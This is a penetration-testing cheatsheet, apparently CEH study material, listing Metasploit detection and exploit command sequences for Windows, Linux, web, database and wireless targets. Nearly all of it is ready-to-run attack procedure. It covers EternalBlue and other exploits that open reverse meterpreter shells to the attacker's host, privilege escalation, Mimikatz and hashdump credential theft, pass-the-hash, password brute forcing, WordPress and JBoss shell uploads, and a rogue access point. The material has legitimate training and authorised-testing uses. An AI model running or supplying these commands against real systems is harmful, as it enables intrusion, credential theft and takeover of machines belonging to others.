Metasploit Toolkit #metasploit_tookit  ‚Äì Detection

> Structured cheatsheet: detection commands mapped to Metasploit exploits, organized by **Windows**, **Linux**, and **Cross‚ÄëPlatform / Post‚ÄëExploitation / Lateral Movement**.

---

## ü™ü Windows

### Remote Vulns

**MS17‚Äë010 (EternalBlue)**

- **Detect**
    

```text
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS <ip_or_cidr>
run
```

- **Exploit**
    

```text
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <ip>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <your_ip>
exploit
```

- **Post‚Äëex**
    

```text
use post/windows/gather/credentials/mimikatz
set SESSION <id>
run
```

**SMB Share Enumeration**

```text
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS <target>
run
```

### Local Privilege Escalation

**Service Permission Misconfig**

- **Detect**
    

```cmd
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
sc qc <service_name>
```

- **Exploit**
    

```text
use exploit/windows/local/service_permissions
set SESSION <id>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit
```

**Unquoted Service Path**

- **Detect**
    

```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\\Windows\\"
```

- **Exploit**
    

```text
use exploit/windows/local/trusted_service_path
set SESSION <id>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit
```

**AlwaysInstallElevated**

- **Detect**
    

```cmd
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

- **Exploit**
    

```text
use exploit/windows/local/always_install_elevated
set SESSION <id>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit
```

**Token Privileges (Potato Attacks)**

- **Detect**
    

```cmd
whoami /priv
```

- **Exploit**
    

```text
getsystem
# or
use exploit/windows/local/ms16_075_reflection
set SESSION <id>
exploit
```

**Missing Hotfix / Kernel Privesc**

- **Detect**
    

```cmd
systeminfo
wmic qfe get HotFixID,InstalledOn
```

- **Exploit**
    

```text
use post/multi/recon/local_exploit_suggester
set SESSION <id>
run
# pick suggested exploit (e.g. ms10_015_kitrap0d)
```

---

## üêß Linux

**Sudo Misconfig (NOPASSWD)**

- **Detect**
    

```bash
sudo -l
```

- **Exploit**: Run allowed GTFOBin command as root.
    

**SUID Binaries**

- **Detect**
    

```bash
find / -perm -4000 -type f 2>/dev/null
```

- **Exploit**: Abuse with GTFOBins (e.g., nmap, vim).
    

**Writable Cron Jobs / Systemd Timers**

- **Detect**
    

```bash
ls -lah /etc/cron* /var/spool/cron
systemctl list-timers --all
```

- **Exploit**: Replace or edit script run by root.
    

**PATH Hijacking**

- **Detect**
    

```bash
strings /path/to/script | grep -E "(/usr/bin/|/bin/)"
```

- **Exploit**: Plant malicious binary earlier in PATH.
    

**NFS no_root_squash**

- **Detect**
    

```bash
showmount -e <nfs_server>
```

- **Exploit**: Mount, drop SUID binary, execute.
    

**Docker / LXC Escape**

- **Detect**
    

```bash
id | grep docker
```

- **Exploit**: Run privileged container, mount `/`.
    

**Kernel Exploits**

- **Detect**
    

```bash
uname -a
cat /etc/os-release
```

- **Exploit**
    

```text
use post/multi/recon/local_exploit_suggester
set SESSION <id>
run
# Example:
use exploit/linux/local/dirty_cow
set SESSION <id>
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST <your_ip>
exploit
```

---

## üåê Cross‚ÄëPlatform Post‚ÄëExploitation

**Hash Dump (Windows)**

```text
use post/windows/gather/hashdump
set SESSION <id>
run
```

**Mimikatz (Windows)**

```text
use post/windows/gather/credentials/mimikatz
set SESSION <id>
run
```

**SSH Credential Harvesting (Multi)**

```text
use post/multi/gather/ssh_creds
set SESSION <id>
run
```

**Pivoting / Routing**

```text
use post/multi/manage/autoroute
set SESSION <id>
run

use auxiliary/server/socks4a
set SRVPORT 1080
run
```

---

## üîÄ Lateral Movement

**SMB Pass‚Äëthe‚ÄëHash (Windows)**

```text
use exploit/windows/smb/psexec
set RHOSTS <target>
set SMBUser <user>
set SMBDomain <domain_or_.>
set SMBPass aad3b435b51404eeaad3b435b51404ee:<NThash>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <your_ip>
exploit
```

**WinRM / RDP Login Scan**

```text
use auxiliary/scanner/winrm/winrm_login
set RHOSTS <cidr>
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```

**SSH Lateral (Linux)**

```text
use auxiliary/scanner/ssh/ssh_login
set RHOSTS <cidr>
set USER_FILE users.txt
set PASS_FILE passwords.txt
set STOP_ON_SUCCESS true
run

use post/multi/manage/shell_to_meterpreter
set SESSION <id>
run
```

---

## üìë Quick Reference Index

- **Windows**: service perms ‚Üí `exploit/windows/local/service_permissions`; unquoted path ‚Üí `trusted_service_path`; AlwaysInstallElevated ‚Üí `always_install_elevated`; SeImpersonate ‚Üí `getsystem`/`ms16_075_reflection`; MS17-010 ‚Üí `ms17_010_eternalblue`
    
- **Linux**: dirty_cow, sudo misconfig, SUID/cron/NFS/Docker ‚Üí manual or `local_exploit_suggester`
    
- **Post-Ex**: hashdump, Mimikatz, ssh_creds, autoroute
    
- **Lateral**: psexec (PTH), winrm_login, ssh_login
    

---

## üåê Web, Database & Wireless Modules

### Web

**SQL Injection Scanner**

```text
use auxiliary/scanner/http/sql_injection
set RHOSTS <ip>
set RPORT 80
set TARGETURI /
run
```

**XSS Scanner**

```text
use auxiliary/scanner/http/xss_scanner
set RHOSTS <ip>
set RPORT 80
set TARGETURI /
run
```

**WordPress Scanner**

```text
use auxiliary/scanner/http/wordpress_scanner
set RHOSTS <ip>
set RPORT 80
set TARGETURI /
run
```

**WordPress Admin Shell Upload (needs creds)**

```text
use exploit/unix/webapp/wp_admin_shell_upload
set RHOSTS <ip>
set RPORT 80
set TARGETURI /
set USERNAME <admin>
set PASSWORD <password>
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST <your_ip>
exploit
```

**JBoss Vuln Scan**

```text
use auxiliary/scanner/http/jboss_vulnscan
set RHOSTS <ip>
set RPORT 8080
run
```

**JBoss Main Deployer Exploit**

```text
use exploit/multi/http/jboss_maindeployer
set RHOSTS <ip>
set RPORT 8080
set TARGETURI /
set PAYLOAD java/jsp_shell_reverse_tcp
set LHOST <your_ip>
exploit
```

### Database

**MySQL Version / Login Brute Force**

```text
use auxiliary/scanner/mysql/mysql_version
set RHOSTS <ip>
run

use auxiliary/scanner/mysql/mysql_login
set RHOSTS <ip>
set USER_FILE users.txt
set PASS_FILE passwords.txt
set STOP_ON_SUCCESS true
run
```

**MySQL UDF Payload (after creds)**

```text
use exploit/multi/mysql/mysql_udf_payload
set RHOST <ip>
set USERNAME <user>
set PASSWORD <pass>
set PAYLOAD linux/x64/meterpreter/reverse_tcp   # or windows/*
set LHOST <your_ip>
set LPORT 4444
exploit
```

### Wireless

**Rogue AP Setup (lab only)**

```text
use auxiliary/scanner/wifi/wifi_rogue_ap
show options
set INTERFACE wlan0
set SSID LabAP
set CHANNEL 6
run
```

---

The cheatsheet includes **Windows**, **Linux**, **Cross‚ÄëPlatform/Post‚ÄëExploitation/Lateral Movement**, and all **Web, Database, and Wireless modules** from the original CEH toolkit.

- ü™ü **Windows**: Remote vulns, local privesc, lateral movement.
    
- üêß **Linux**: Local privesc (all main checks), lateral movement.
    
- üåê **Cross-Platform**: Post-exploitation, pivoting.
    
- üåç **Web/DB/Wireless**: SQLi, XSS, WordPress, JBoss, MySQL, Rogue AP.